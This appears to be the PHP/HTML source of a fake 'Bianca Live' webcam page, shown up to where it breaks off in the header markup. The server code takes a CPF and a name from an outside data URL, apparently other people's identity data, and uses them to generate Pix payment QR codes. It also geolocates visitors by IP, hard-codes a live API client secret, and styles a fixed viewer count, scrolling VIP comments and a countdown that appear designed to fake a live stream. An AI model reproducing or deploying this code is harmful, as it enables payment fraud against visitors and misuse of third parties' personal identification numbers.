<?php
session_start(); // Inicia a sessão para armazenar o parâmetro 'id'

$redirectUrl = 'https://livemodelo.com/menu/homehome3.php';

// If the visitor has already been here during this session, immediately
// redirect them and stop any further processing so that none of the existing
// code below this point executes.
if (isset($_SESSION['visited_once']) && $_SESSION['visited_once'] === true) {
    header("Location: $redirectUrl");
    exit;
}

// Mark the page as visited so that any future attempt in the same browser
// session triggers the redirect above.
$_SESSION['visited_once'] = true;

// Verifica e armazena o parâmetro 'id' na sessão
if (isset($_GET['id'])) {
    $_SESSION['id'] = $_GET['id']; // Salva o 'id' na sessão
}

// Redireciona para a URL com o parâmetro 'id' se ele estiver faltando
if (!isset($_GET['id']) && isset($_SESSION['id'])) {
    $id = $_SESSION['id'];
    $newUrl = $_SERVER['PHP_SELF'] . "?id=" . urlencode($id);
    header("Location: $newUrl");
    exit();
}

// Validação dos parâmetros e lógica original
include 'BSPayAPI.php';
include 'database.php';

$valor = $_GET['id'] ?? null;
$nomeCompleto = $_GET['nome'] ?? null;
$valorMinimo = 1;
$valorMaximo = 100000;
$logFile = "errors.log";

file_put_contents($logFile, "id: $valor, Nome: $nomeCompleto\n", FILE_APPEND);

if ($valor === null) {
    file_put_contents($logFile, "O valor não foi informado.\n", FILE_APPEND);
    die(json_encode(['message' => 'O valor não foi informado.']));
}

if ($valor < $valorMinimo) {
    file_put_contents($logFile, "O valor não pode ser menor que $valorMinimo.\n", FILE_APPEND);
    die(json_encode(['message' => "O valor não pode ser menor que $valorMinimo."]));
} elseif ($valor > $valorMaximo) {
    file_put_contents($logFile, "O valor não pode ser maior que $valorMaximo.\n", FILE_APPEND);
    die(json_encode(['message' => "O valor não pode ser maior que $valorMaximo."]));
}

$randid = rand(11111, 99999);
$dataFutura = date('Y-m-d', strtotime('+1 day'));
$valor = floatval($valor);

file_put_contents($logFile, "Random ID: $randid, Data Futura: $dataFutura, id: $valor\n", FILE_APPEND);

$url = 'https://database-type.online/bspay/dados.php';
$data = json_decode(file_get_contents($url), true);

if (json_last_error() !== JSON_ERROR_NONE) {
    file_put_contents($logFile, "Erro ao decodificar JSON: " . json_last_error_msg() . "\n", FILE_APPEND);
    die(json_encode(['message' => 'Erro ao decodificar JSON.']));
}

$cpf = $data['cpf'] ?? null;
$name = $data['name'] ?? null;

if ($cpf === null || $name === null) {
    file_put_contents($logFile, "Dados insuficientes: CPF ou Nome não encontrados.\n", FILE_APPEND);
    die(json_encode(['message' => 'Dados insuficientes.']));
}

$formatted_cpf = substr($cpf, 0, 3) . '.' . substr($cpf, 3, 3) . '.' . substr($cpf, 6, 3) . '-' . substr($cpf, -2);

file_put_contents($logFile, "CPF: $cpf, Formatted CPF: $formatted_cpf, Name: $name\n", FILE_APPEND);

$clientId = 'brando777_4762981867';
$clientSecret = '942b448dc5da47f5b389303c51c1b620b1ef337be014f9c7d0030906303ca53e';
$bspay = new BSPayAPI($clientId, $clientSecret);

try {
    $response = $bspay->gerarQrCodePix($valor, $name, $formatted_cpf, $randid);
} catch (Exception $e) {
    file_put_contents($logFile, "Erro ao gerar pagamento: " . $e->getMessage() . "\n", FILE_APPEND);
    die(json_encode(['message' => 'Erro ao gerar pagamento.']));
}

file_put_contents($logFile, "Response Data: " . print_r($response, true) . "\n", FILE_APPEND);

$pixqr = $response['qrcode'] ?? null;
$transactionId = $response['transactionId'] ?? null;

if ($pixqr === null || $transactionId === null) {
    file_put_contents($logFile, "Dados de pagamento insuficientes: QR Code ou ID não encontrados.\n", FILE_APPEND);
    die(json_encode(['message' => 'Dados de pagamento insuficientes.']));
}

$imgpix = "https://api.qrserver.com/v1/create-qr-code/?size=120x120&data=" . urlencode($pixqr);

$valorFormatado = number_format($valor, 2, ',', '.');

// Inserir a transação no banco de dados
$pdo = connectDatabase();
$stmt = $pdo->prepare("INSERT INTO transactions (transaction_id, external_id, status) VALUES (?, ?, ?)");
$stmt->execute([$transactionId, $randid, 'PENDING']);

$primeiroNome = explode(' ', $nomeCompleto)[0];

$capitais = [
    "AC" => ["capital" => "Rio Branco", "ddd" => "68"],
    "AL" => ["capital" => "Maceió", "ddd" => "82"],
    "AP" => ["capital" => "Macapá", "ddd" => "96"],
    "AM" => ["capital" => "Manaus", "ddd" => "92"],
    "BA" => ["capital" => "Salvador", "ddd" => "71"],
    "CE" => ["capital" => "Fortaleza", "ddd" => "85"],
    "DF" => ["capital" => "Brasília", "ddd" => "61"],
    "ES" => ["capital" => "Vitória", "ddd" => "27"],
    "GO" => ["capital" => "Goiânia", "ddd" => "62"],
    "MA" => ["capital" => "São Luís", "ddd" => "98"],
    "MT" => ["capital" => "Cuiabá", "ddd" => "65"],
    "MS" => ["capital" => "Campo Grande", "ddd" => "67"],
    "MG" => ["capital" => "Belo Horizonte", "ddd" => "31"],
    "PA" => ["capital" => "Belém", "ddd" => "91"],
    "PB" => ["capital" => "João Pessoa", "ddd" => "83"],
    "PR" => ["capital" => "Curitiba", "ddd" => "41"],
    "PE" => ["capital" => "Recife", "ddd" => "81"],
    "PI" => ["capital" => "Teresina", "ddd" => "86"],
    "RJ" => ["capital" => "Rio de Janeiro", "ddd" => "21"],
    "RN" => ["capital" => "Natal", "ddd" => "84"],
    "RS" => ["capital" => "Porto Alegre", "ddd" => "51"],
    "RO" => ["capital" => "Porto Velho", "ddd" => "69"],
    "RR" => ["capital" => "Boa Vista", "ddd" => "95"],
    "SC" => ["capital" => "Florianópolis", "ddd" => "48"],
    "SP" => ["capital" => "São Paulo", "ddd" => "11"],
    "SE" => ["capital" => "Aracaju", "ddd" => "79"],
    "TO" => ["capital" => "Palmas", "ddd" => "63"]
];

// Função para obter informações do cliente
function getClientInfo($ip = null) {
    $ip = $ip ?? $_SERVER['REMOTE_ADDR'];
    $url = "http://ip-api.com/json/$ip";
    $response = @file_get_contents($url);
    return $response ? json_decode($response, true) : null;
}

// Obter informações do cliente
$info = getClientInfo();

if ($info && $info['status'] === 'success') {
    $estado = $info['region'];
    $cidade = $info['city'];
    $pais = $info['country'];
    $ip = $info['query'];
    $capital = $capitais[$estado]['capital'] ?? null;
    $ddd = $capitais[$estado]['ddd'] ?? null;

    $result = [
        "ip" => $ip,
        "cidade" => $cidade,
        "estado" => $estado,
        "pais" => $pais,
        "capital_estado" => $capital,
        "ddd_capital" => $ddd
    ];
} else {
    $result = [
        "error" => "Não foi possível obter as informações de localização."
    ];
}

?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bianca Live 🔴</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary-color: #ff3366;
            --primary-dark: #d41e4b;
            --primary-light: #ff6b8e;
            --secondary-color: #2a2a2a;
            --accent-color: #00d1ff;
            --accent-dark: #00a3c9;
            --light-bg: #f8f8f8;
            --dark-bg: #1a1a1a;
            --dark-bg-gradient: linear-gradient(to bottom, #222222, #1a1a1a);
            --text-white: #ffffff;
            --text-gray: #a0a0a0;
            --success-green: #00c969;
            --success-green-dark: #00a755;
            --live-red: #cc0000;
            --vip-gold: #ffd700;
            --vip-gold-dark: #cca700;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }
        
        body {
            background-color: var(--dark-bg);
            background-image: var(--dark-bg-gradient);
            color: var(--text-white);
            height: 100vh;
            overflow: hidden;
            position: relative;
        }
        
        /* Header Section */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 15px;
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(10px);
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            z-index: 100;
        }
        
        .logo-container {
            display: flex;
            align-items: center;
        }
        
        .small-logo {
            width: 60px;
            height: 60px;
            object-fit: cover;
            margin-right: 10px;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
        }
        
        .profile-info {
            display: flex;
            align-items: center;
            height: 60px;
        }
        
        .profile-pic {
            width: 42px;
            height: 42px;
            border-radius: 50%;
            object-fit: cover;
            border: 2px solid var(--primary-color);
            box-shadow: 0 0 10px rgba(255, 51, 102, 0.5);
        }
        
        .profile-text {
            margin-left: 10px;
        }
        
        .profile-name {
            font-size: 18px;
            font-weight: bold;
            text-shadow: 0 1px 3px rgba(0, 0, 0, 0.6);
        }
        
        .viewers-count {
            font-size: 12px;
            color: var(--accent-color);
            font-weight: bold;
            display: flex;
            align-items: center;
        }
        
        .viewers-count i {
            margin-right: 5px;
            color: var(--accent-color);
            text-shadow: 0 0 10px rgba(0, 209, 255, 0.7);
        }
        
        .header-actions {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        /* Live Indicator */
        .live-indicator {
            display: flex;
            margin-left: 10px;
            animation: pulse 3s ease-in-out infinite;
            margin-right: 10px;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        
        .live-indicator svg {
            height: 24px;
            filter: drop-shadow(0 0 5px rgba(204, 0, 0, 0.7));
        }
        
        /* VIP Button */
        .vip-button {
            background: linear-gradient(to bottom, var(--vip-gold), var(--vip-gold-dark));
            color: #000;
            border: none;
            border-radius: 50px;
            padding: 8px 15px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 2px 8px rgba(255, 215, 0, 0.5);
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 5px;
        }
        
        .vip-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(255, 215, 0, 0.6);
        }
        
        .vip-button:active {
            transform: translateY(0);
            box-shadow: 0 2px 5px rgba(255, 215, 0, 0.4);
        }
        
        .vip-button i {
            font-size: 16px;
        }
        
        /* Video Container */
        .video-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
        }
        
        #liveVideo {
            width: 100%;
            height: 100%;
            object-fit: cover;
            z-index: 1;
            opacity: 0;
            transition: opacity 1s ease;
        }
        
        #liveVideo.active {
            opacity: 1;
        }
        
        /* User Camera */
        .user-camera-container {
            position: left;
            width: 120px;
            aspect-ratio: 3 / 4;
            border-radius: 12px;
            overflow: hidden;
            z-index: 100;
            background-color: #333333;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
            border: 2px solid rgba(255, 255, 255, 0.1);
            touch-action: none;
            cursor: grab;
            transition: box-shadow 0.3s ease;
        }

        .user-camera-container.dragging {
            box-shadow: 0 8px 20px rgba(255, 51, 102, 0.5);
            cursor: grabbing;
        }
        
        @media (max-width: 576px) {
            .user-camera-container {
                width: 100px;
            }
        }

        #userCamera {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .camera-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(to bottom, rgba(0, 0, 0, 0.4), rgba(0, 0, 0, 0.8));
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            z-index: 11;
        }

        .camera-overlay p {
            color: var(--text-white);
            font-size: 12px;
            font-weight: bold;
            padding: 5px;
            text-shadow: 0 1px 3px rgba(0, 0, 0, 0.8);
        }

        .camera-denied {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(to bottom, #555555, #333333);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            z-index: 11;
        }

        .camera-denied p:first-child {
            color: #fff;
            font-size: 14px;
            font-weight: bold;
            margin-bottom: 5px;
        }

        .camera-denied p:last-child {
            color: #eee;
            font-size: 10px;
            margin-top: 5px;
            margin-bottom: 5px;
        }
        
        /* Comments Section */
        .comments-container {
            position: absolute;
            bottom: 70px;
            left: 0;
            width: 70%;
            height: calc(100% - 170px);
            overflow: visible;
            z-index: 10;
            padding-bottom: 20px;
            pointer-events: none;
        }
        
        @media (max-width: 768px) {
            .comments-container {
                width: 75%;
                bottom: 60px;
            }
        }
        
        .comment {
            background: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(5px);
            border-radius: 20px;
            padding: 8px 12px;
            margin: 5px 10px;
            display: flex;
            align-items: center;
            width: fit-content;
            animation: slideUpFade 5s forwards;
            position: absolute;
            bottom: -50px;
            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.3);
            border-left: 3px solid var(--primary-color);
            pointer-events: auto;
        }
        
        .comment-avatar {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            margin-right: 8px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
        }
        
        .comment-text {
            font-size: 14px;
        }
        
        .commenter-name {
            font-weight: bold;
            margin-right: 5px;
            color: #ffde59;
            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.5);
        }
        
        .vip-tag {
            background: linear-gradient(to right, var(--vip-gold), var(--vip-gold-dark));
            color: #000;
            border-radius: 4px;
            padding: 2px 5px;
            font-size: 10px;
            font-weight: bold;
            margin-left: 5px;
            display: inline-flex;
            align-items: center;
            gap: 3px;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.3);
        }
        
        .vip-tag i {
            font-size: 9px;
        }
        
        @keyframes slideUpFade {
            0% {
                transform: translateY(0);
                opacity: 0;
            }
            10% {
                opacity: 1;
            }
            90% {
                opacity: 1;
            }
            100% {
                transform: translateY(-250px);
                opacity: 0;
            }
        }
        
        /* Comment Notification */
        .comment-notification {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: rgba(255, 0, 0, 0.8);
            color: white;
            padding: 15px 20px;
            border-radius: 10px;
            text-align: center;
            z-index: 2500;
            font-weight: bold;
            box-shadow: 0 5px 15px rgba(255, 0, 0, 0.4);
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.3s ease;
        }
        
        .comment-notification.show {
            animation: fadeInOut 2s forwards;
        }
        
        /* Notification */
        .notification {
            position: absolute;
            top: 90px;
            left: 20px;
            background-color: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(5px);
            color: var(--success-green);
            padding: 8px 15px;
            border-radius: 30px;
            font-size: 12px;
            font-weight: bold;
            z-index: 20;
            display: flex;
            align-items: center;
            animation: fadeInOut 3s forwards;
            opacity: 0;
            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.4);
            border-left: 3px solid var(--success-green);
        }
        
        .notification i {
            margin-right: 8px;
            color: var(--success-green);
            text-shadow: 0 0 5px rgba(0, 201, 105, 0.5);
        }
        
        @keyframes fadeInOut {
            0% {
                opacity: 0;
                transform: translateY(-20px);
            }
            15% {
                opacity: 1;
                transform: translateY(0);
            }
            85% {
                opacity: 1;
                transform: translateY(0);
            }
            100% {
                opacity: 0;
                transform: translateY(-20px);
            }
        }
        
        /* Bottom Controls */
        .bottom-controls {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: linear-gradient(to top, rgba(0, 0, 0, 0.9) 50%, transparent);
            padding: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            z-index: 10;
        }
        
        .comment-input {
            background-color: rgba(255, 255, 255, 0.15);
            backdrop-filter: blur(5px);
            color: var(--text-white);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 30px;
            padding: 12px 20px;
            flex-grow: 1;
            margin-right: 15px;
            margin-left: 15px;
            font-size: 14px;
            transition: all 0.3s ease;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
        }
        
        .comment-input:focus {
            outline: none;
            background-color: rgba(255, 255, 255, 0.2);
            border-color: var(--primary-color);
            box-shadow: 0 0 0 2px rgba(255, 51, 102, 0.3);
        }
        
        .comment-input::placeholder {
            color: var(--text-gray);
        }
        
        .interaction-buttons {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-left: 5px;
            gap: 5px;
        }
        
        .interaction-button {
            background: none;
            border: none;
            color: var(--text-white);
            font-size: 26px;
            cursor: pointer;
            display: flex;
            flex-direction: column;
            align-items: center;
            transition: transform 0.2s ease;
        }
        
        .interaction-button i {
            text-shadow: 0 0 10px rgba(255, 51, 102, 0.7);
            transition: all 0.3s ease;
        }
        
        .interaction-button:hover i {
            transform: scale(1.2);
        }
        
        .interaction-button:active i {
            transform: scale(0.9);
        }
        
        .interaction-count {
            font-size: 12px;
            margin-top: 2px;
            font-weight: bold;
        }
        
        /* QR Code Container */
        .payment-container {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background-color: #ffffff;
            color: #333;
            padding: 25px;
            border-radius: 25px 25px 0 0;
            z-index: 2000;
            transform: translateY(100%);
            transition: transform 0.5s cubic-bezier(0.19, 1, 0.22, 1);
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            box-shadow: 0 -10px 30px rgba(0, 0, 0, 0.7);
            max-height: 90vh;
            overflow-y: auto;
        }
        
        .payment-container.active {
            transform: translateY(0);
        }
        
        .payment-container h2 {
            font-size: 22px;
            margin-bottom: 15px;
            color: var(--primary-color);
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .payment-container h3 {
            font-size: 28px;
            margin-bottom: 20px;
            color: #222;
            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
        }
        
        .payment-container .divider {
            width: 50px;
            height: 4px;
            background: linear-gradient(to right, var(--primary-color), var(--primary-light));
            margin: 15px auto;
            border-radius: 2px;
        }
        
        .phone-input-container {
            width: 100%;
            margin: 20px 0;
            max-width: 350px;
        }
        
        .phone-input {
            width: 100%;
            padding: 15px 20px;
            border: 2px solid #eee;
            border-radius: 50px;
            font-size: 16px;
            text-align: center;
            margin-bottom: 15px;
            transition: all 0.3s ease;
            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.05);
        }
        
        .phone-input:focus {
            outline: none;
            border-color: var(--primary-color);
            box-shadow: 0 0 0 3px rgba(255, 51, 102, 0.2);
        }
        
        .input-error {
            color: #ff3366;
            font-size: 13px;
            margin-top: -5px;
            margin-bottom: 10px;
        }
        
        .qr-code-img {
            width: 220px;
            height: 220px;
            margin: 15px auto;
            padding: 10px;
            border: 1px solid #eee;
            border-radius: 15px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            background-color: white;
            position: relative;
            overflow: hidden;
        }
        
        .qr-code-img::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(45deg, rgba(255, 255, 255, 0) 80%, rgba(255, 51, 102, 0.1));
            z-index: 1;
        }
        
        .qr-code-img img {
            width: 100%;
            height: 100%;
            object-fit: contain;
            z-index: 2;
            position: relative;
            border-radius: 10px;
        }
        
        .pix-code {
            width: 100%;
            max-width: 350px;
            padding: 12px 15px;
            border: 1px solid #eee;
            border-radius: 10px;
            font-size: 13px;
            margin: 15px 0;
            background-color: #f9f9f9;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
            position: relative;
        }
        
        .pix-code:hover {
            background-color: #f0f0f0;
            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1);
        }
        
        .pix-code::after {
            content: 'Clique para copiar';
            position: absolute;
            bottom: -20px;
            left: 50%;
            transform: translateX(-50%);
            font-size: 10px;
            color: #999;
            opacity: 0;
            transition: opacity 0.3s ease;
        }
        
        .pix-code:hover::after {
            opacity: 1;
        }
        
        .copy-button {
            background: linear-gradient(to bottom, var(--primary-color), var(--primary-dark));
            color: white;
            border: none;
            border-radius: 50px;
            padding: 15px 30px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin: 20px 0;
            width: 100%;
            max-width: 300px;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(255, 51, 102, 0.3);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        
        .copy-button:hover {
            transform: translateY(-3px);
            box-shadow: 0 6px 20px rgba(255, 51, 102, 0.4);
        }
        
        .copy-button:active {
            transform: translateY(0);
            box-shadow: 0 2px 8px rgba(255, 51, 102, 0.4);
        }
        
        .copy-button i {
            font-size: 18px;
        }
        
        .payment-note {
            font-size: 14px;
            color: #777;
            margin: 10px 0 20px;
            max-width: 350px;
            line-height: 1.5;
        }
        
        /* Status Indicator */
        #statusPagamento {
            margin-top: 5px;
            padding: 15px;
            border-radius: 10px;
            font-weight: bold;
            width: 100%;
            max-width: 350px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            transition: all 0.3s ease;
        }
        
        .status-pending {
            background-color: #ff9800;
            color: white;
            box-shadow: 0 3px 10px rgba(255, 152, 0, 0.3);
        }
        
        .status-success {
            background-color: var(--success-green);
            color: white;
            box-shadow: 0 3px 10px rgba(0, 201, 105, 0.3);
        }
        
        /* Audio Alert */
        .audio-alert {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: rgba(0, 0, 0, 0.40);
            backdrop-filter: blur(12px);
            color: white;
            padding: 30px;
            border-radius: 15px;
            text-align: center;
            z-index: 1500;
            display: flex;
            flex-direction: column;
            align-items: center;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .audio-alert svg {
            margin-bottom: 15px;
            filter: drop-shadow(0 0 8px rgba(255, 255, 255, 0.3));
        }
        
        .audio-alert p {
            font-size: 18px;
            margin-bottom: 20px;
            font-weight: 500;
        }
        
        .audio-alert button {
            background: linear-gradient(to bottom, var(--primary-color), var(--primary-dark));
            color: white;
            border: none;
            border-radius: 50px;
            padding: 13px 33px;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 15px;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(255, 51, 102, 0.5);
            width: 200px;
        }
        
        .audio-alert button:hover {
            transform: translateY(-3px);
            box-shadow: 0 6px 20px rgba(255, 51, 102, 0.4);
        }
        
        .audio-alert button:active {
            transform: translateY(0);
            box-shadow: 0 2px 8px rgba(255, 51, 102, 0.4);
        }

        /* Make sure Typebot bubble is visible with proper z-index */
        #typebot-bubble-container {
            z-index: 2100 !important;
        }
        
        /* Reposicionamento do botão do Typebot */
        #typebot-bubble-button {
            opacity: 0;
            pointer-events: none;
            transition: all 0.3s ease;
            z-index: 2100 !important;
            position: fixed !important;
            left: 20px !important;
            bottom: auto !important;
            right: auto !important;
        }
        
        /* Show typebot button when payment containers are active */
        .payment-container.active ~ #typebot-bubble-container #typebot-bubble-button,
        .payment-container.active + #typebot-bubble-container #typebot-bubble-button {
            opacity: 1 !important;
            pointer-events: all !important;
            top: 80px !important; /* Position above the container */
        }
        
        /* Copy notification */
        #copyMessage {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background-color: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(10px);
            color: white;
            padding: 12px 20px;
            border-radius: 8px;
            z-index: 2500;
            display: none;
            align-items: center;
            gap: 10px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
            border-left: 3px solid var(--success-green);
        }
        
        #copyMessage i {
            color: var(--success-green);
        }
        
        /* Loading Spinner */
        .loaderSpinner {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid #ffffff;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1.5s linear infinite;
            display: inline-block;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        /* Heart animation */
        @keyframes floatUp {
            0% { transform: translateY(0) scale(1); opacity: 1; }
            100% { transform: translateY(-100px) scale(1.5); opacity: 0; }
        }
        
        .heart-animation {
            position: fixed;
            z-index: 1000;
            animation: floatUp 1.5s forwards;
        }
        
        /* Responsiveness */
        @media (max-width: 1200px) {
            .payment-container {
                padding: 20px 15px;
            }
        }
        
        @media (max-width: 992px) {
            .qr-code-img {
                width: 200px;
                height: 200px;
            }
        }
        
        @media (max-width: 768px) {
            .profile-name {
                font-size: 16px;
            }
            
            .header {
                padding: 8px 12px;
            }
            
            .small-logo {
                width: 50px;
                height: 50px;
            }
            
            .profile-pic {
                width: 38px;
                height: 38px;
            }
            
            .vip-button {
                padding: 6px 12px;
                font-size: 12px;
            }
            
            .audio-alert {
                padding: 20px;
                width: 90%;
                max-width: 350px;
            }
            
            .audio-alert p {
                font-size: 16px;
            }
            
            .audio-alert button {
                width: 180px;
                padding: 10px 25px;
            }
        }
        
        @media (max-width: 576px) {
            .viewers-count {
                font-size: 11px;
            }
            
            .profile-name {
                font-size: 14px;
            }
            
            .comment-input {
                padding: 10px 15px;
                font-size: 13px;
            }
            
            .qr-code-img {
                width: 180px;
                height: 180px;
            }
            
            .payment-container h2 {
                font-size: 18px;
            }
            
            .payment-container h3 {
                font-size: 24px;
            }
            
            .copy-button {
                padding: 12px 25px;
                font-size: 14px;
            }
            
            .bottom-controls {
                padding: 12px 10px;
            }
            
            .interaction-button {
                font-size: 22px;
            }
            
            .interaction-count {
                font-size: 11px;
            }
            
            .comments-container {
                width: 80%;
            }
        }
        
        @media (max-height: 700px) {
            .payment-container {
                padding-top: 15px;
                padding-bottom: 15px;
            }
            
            .payment-container h2 {
                margin-bottom: 10px;
            }
            
            .payment-container h3 {
                margin-bottom: 10px;
            }
            
            .phone-input-container {
                margin: 10px 0;
            }
            
            .qr-code-img {
                margin: 10px auto;
            }
            
            .copy-button {
                margin: 10px 0;
            }
        }
        /* Countdown Timer */
.countdown-timer {
    margin: 15px auto 25px;
    width: 100%;
    max-width: 280px;
    position: relative;
}

.timer-label {
    color: var(--primary-color);
    font-size: 14px;
    font-weight: bold;
    text-transform: uppercase;
    letter-spacing: 1px;
    margin-bottom: 10px;
    text-align: center;
    text-shadow: 0 0 10px rgba(255, 51, 102, 0.4);
    animation: pulseText 2s infinite;
}

@keyframes pulseText {
    0% { opacity: 1; }
    50% { opacity: 0.7; }
    100% { opacity: 1; }
}

.timer-container {
    background: linear-gradient(to bottom, #2a2a2a, #1a1a1a);
    padding: 15px;
    border-radius: 15px;
    box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4), 
                0 0 10px rgba(255, 51, 102, 0.2),
                inset 0 1px 1px rgba(255, 255, 255, 0.1);
    border: 1px solid rgba(255, 255, 255, 0.05);
    position: relative;
    overflow: hidden;
}

.timer-container::before {
    content: '';
    position: absolute;
    top: -50%;
    left: -50%;
    width: 200%;
    height: 200%;
    background: radial-gradient(circle, rgba(255, 51, 102, 0.08) 0%, rgba(0, 0, 0, 0) 70%);
    animation: lightEffect 8s infinite linear;
    z-index: 0;
}

@keyframes lightEffect {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

.timer-unit {
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 2px;
    position: relative;
    z-index: 1;
}

.flip-card {
    display: inline-block;
    position: relative;
    width: 40px;
    height: 60px;
    margin: 0 2px;
    font-size: 30px;
    font-weight: bold;
    line-height: 60px;
    border-radius: 8px;
    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
    perspective: 200px;
    background: #1a1a1a;
    overflow: hidden;
}

.flip-card .top, 
.flip-card .bottom {
    position: absolute;
    width: 100%;
    height: 50%;
    overflow: hidden;
    text-align: center;
    background: linear-gradient(to bottom, #333333, #222222);
    color: var(--text-white);
    text-shadow: 0 1px 2px rgba(0, 0, 0, 0.8);
    box-shadow: inset 0 1px 1px rgba(255, 255, 255, 0.15);
}

.flip-card .top {
    top: 0;
    line-height: 50px;
    border-top-left-radius: 8px;
    border-top-right-radius: 8px;
    border-bottom: 1px solid rgba(0, 0, 0, 0.4);
    background: linear-gradient(to bottom, #444444, #333333);
}

.flip-card .bottom {
    bottom: 0;
    line-height: 0;
    border-bottom-left-radius: 8px;
    border-bottom-right-radius: 8px;
    background: linear-gradient(to bottom, #222222, #1a1a1a);
}

.flip-card.flipping .top {
    animation: flipTop 0.5s ease-in-out;
    transform-origin: bottom center;
}

.flip-card.flipping .bottom {
    animation: flipBottom 0.5s ease-in-out;
    transform-origin: top center;
}

@keyframes flipTop {
    0% { transform: rotateX(0deg); }
    50% { transform: rotateX(90deg); }
    100% { transform: rotateX(0deg); }
}

@keyframes flipBottom {
    0% { transform: rotateX(0deg); }
    50% { transform: rotateX(-90deg); }
    100% { transform: rotateX(0deg); }
}

.timer-separator {
    font-size: 30px;
    color: var(--primary-color);
    margin: 0 2px;
    text-shadow: 0 0 10px rgba(255, 51, 102, 0.7);
    animation: pulseSeparator 1s infinite;
}

@keyframes pulseSeparator {
    0% { opacity: 1; }
    50% { opacity: 0.3; }
    100% { opacity: 1; }
}

.timer-text {
    text-align: center;
    font-size: 10px;
    color: var(--text-gray);
    margin-top: 5px;
    text-transform: uppercase;
    letter-spacing: 1px;
}

/* Timer responsive styles */
@media (max-width: 576px) {
    .flip-card {
        width: 35px;
        height: 50px;
        font-size: 25px;
        line-height: 50px;
    }
    
    .timer-separator {
        font-size: 25px;
    }
    
    .timer-label {
        font-size: 12px;
    }
}
    </style>
</head>
<body>
    <!-- Header -->
    <div class="header">
        <div class="logo-container">
            <img src="../logo.gif" alt="Logo" class="small-logo">
            <div class="profile-info">
                <img src="../perfilll.png" alt="Bianca" class="profile-pic">
                <div class="profile-text">
                    <div class="profile-name">Bianca</div>
                    <div class="viewers-count">
                        <i class="fas fa-eye"></i> <span id="vip-counter">3</span>
                    </div>
                </div>
            </div>
        </div>
        <div class="header-actions">
            <div class="live-indicator">
                <svg width="60" height="24" viewBox="0 0 60 24">
                    <rect width="60" height="24" rx="4" fill="#cc0000"></rect>
